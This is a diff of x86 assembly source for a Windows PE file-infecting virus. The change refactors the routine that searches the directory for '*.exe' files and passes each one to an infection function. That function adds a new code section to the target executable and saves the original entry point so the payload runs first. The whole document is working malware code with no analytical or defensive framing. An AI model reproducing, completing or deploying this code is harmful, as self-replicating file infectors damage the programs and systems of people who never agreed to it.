@@ -72,119 +72,113 @@ deltaoffset:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
-jmp benjamin ; For testing
+;jmp benjamin ; For testing
+
+    push    ebp ; Delta offset
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    find_file
+
+    jmp     exit_success
 
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Find first file to infect
 ; following filter '*.exe', exit_fail if none is found
-; no param
+; 3 params:
+;   pointer to the DOS header -> ebp + 8
+;   pointer to the PE header -> ebp + 12
+;   address of the delta offset -> ebp + 16
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-find_first:
-
-    ; Get FindFirstFileA addr
-    mov     eax,ebp
-    add     eax,offset FindFirstFile_b
-    sub     eax,offset deltaoffset
-    push    eax ; Address of the func name
-    push    edi ; PE header
-    push    esi ; DOS header
-    call    ent_get_function_addr
+find_file:
 
     ; Set up a stack frame
     push    ebp
     mov     ebp,esp
+    ; Saves context
+    push    ebx
+    push    esi
+    push    edi
+
+    ; Get FindFirstFileA addr
+    mov     eax,[ebp+16]
+    add     eax,offset FindFirstFile_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    call    ent_get_function_addr
+    push    eax ; [ebp - 16]
+    ; Get FindNextFileA addr
+    mov     eax,[ebp+16]
+    add     eax,offset FindNextFile_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
+    call    ent_get_function_addr
+    push    eax ; [ebp-20]
 
     ; make room for a WIN32_FIND_DATA struct of 320 at @esp
-    sub     esp,320
+    sub     esp,344
 
     ; push WIN32_FIND_DATA struct and filter '*.exe' and call FindFirstFile
-    lea     ebx,[ebp-320]
+    lea     ebx,[ebp-344]
     push    ebx
     lea     ebx,[filter]
     push    ebx
-    call    eax
+    mov     ebx,[ebp-16]
+    call    ebx
 
     ; If it hasn't found any file, jumps to exit_fail
     cmp     eax,-1
     jz      exit_fail
 
     ; else save handler
-    mov     ebx,eax
+    ;push    eax ; [ebp-24]
+    mov     [ebp-24],eax
+    jmp     infect
 
-    ; store cFileName in eax
-    sub     ebp,276
-    mov     eax,ebp ; save cFileName
-    add     ebp,276
-
-    ; cleanup
-    add     esp,320 ; alloc for WIN32_FIND_DATA and handler
-    mov     esp,ebp
-    pop     ebp
-
-    push    eax ; file name
-    push    ebp ; Delta offset
-    push    edi ; PE header
-    push    esi ; DOS header
-    call    infect_file
-
-
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-; Find next file(s) to infect
-; following filter '*.exe', exit_fail if none is found
-; no param
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-find_next:
-
-    ; Get FindNextFileA addr
-    mov     eax,ebp
-    add     eax,offset FindNextFile_b
-    sub     eax,offset deltaoffset
-    push    eax ; Address of the func name
-    push    edi ; PE header
-    push    esi ; DOS header
-    call    ent_get_function_addr
-
-    ; Set up a stack frame
-    push    ebp
-    mov     ebp,esp
-
-    ; make room for a WIN32_FIND_DATA struct of 320 at @esp
-    sub     esp,320
+    find_next:
 
     ; push WIN32_FIND_DATA struct, find handle and call FindNextFileA
-    lea     edx,[ebp-320]
-    push    edx
-    mov     edx,ebx ; find handle
-    push    edx
-    call    eax
+    lea     ebx,[ebp-344]
+    push    ebx
+    mov     ebx,[ebp-24] ; find handle
+    push    ebx
+    mov     ebx,[ebp-20]
+    call    ebx
 
-    ; if no file found, exit_fail (regular exit?)
+    ; if no file found, jump to end_find_next
     cmp     eax,00h
-    jz      exit_fail
+    jz      end_find_file
 
+    infect:
     ; store cFileName in eax
-    sub     ebp,276
+    sub     ebp,300
     mov     eax,ebp ; save cFileName
-    add     ebp,276
+    add     ebp,300
 
-    ; restore ebp
-    add     esp,320 ; alloc for WIN32_FIND_DATA and handler
-    mov     esp,ebp
-    pop     ebp
-
-    ; infect next .exe file
     push    eax ; file name
-    push    ebp ; Delta offset
-    push    edi ; PE header
-    push    esi ; DOS header
+    push    [ebp+16] ; Delta offset
+    push    [ebp+12] ; PE header
+    push    [ebp+8] ; DOS header
     call    infect_file
 
-    ; loop for more .exe files
     jmp     find_next
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+    end_find_file:
+    ; cleanup/return
+    pop     edi
+    pop     esi
+    pop     ebx
+    add     esp,344 ; alloc for WIN32_FIND_DATA
+    mov     esp,ebp
+    pop     ebp
+    ret     16
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Infect file
 ; 4 params:
 ;   pointer to the DOS header -> ebp + 8
@@ -232,21 +226,20 @@ infect_file:
 
     ; else
     push    eax ; save the fd
-
     ; Create a new section
     push    eax ; File descriptor
-    push    ebp ; Delta offset
-    push    edi ; PE header
-    push    esi ; DOS header
+    push    [ebp+16] ; Delta offset
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
     call    new_code_section
 
     pop     ebx ; restore the fd
-    mov     eax,ebp
+    mov     eax,[ebp+16]
     add     eax,offset CloseHandle_b
     sub     eax,offset deltaoffset
     push    eax ; Address of the func name
-    push    edi ; PE header
-    push    esi ; DOS header
+    push    [ebp+12] ; PE header
+    push    [ebp+8]  ; DOS header
     call    ent_get_function_addr
     ; CloseHandle(fd)
     push    ebx
@@ -322,7 +315,7 @@ benjamin:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Create a new code section in the executable
 ; Return the old entry point (to resume execution after our payload) or 0
-; 3 params:
+; 4 params:
 ;   pointer to the DOS header -> ebp + 8
 ;   pointer to the PE header -> ebp + 12
 ;   address of the delta offset -> ebp + 16
@@ -620,7 +613,7 @@ image_section_done:
     push    0 ; TODO RVA
     push    0 ; TODO Virtual size (virusSize aligned)
     push    0 ; Null padd for name
-    push    0x2e686178 ; name: .hax
+    ;push    0x2e686178 ; name: .hax
     mov     esi,esp ; save esp
 
     ; Write the updated number of section
@@ -631,7 +624,7 @@ image_section_done:
     push    esi ; struct address on stack
     push    [ebp+40]
     call    ebx
-    
+
     ; return success
     mov     eax,0
 
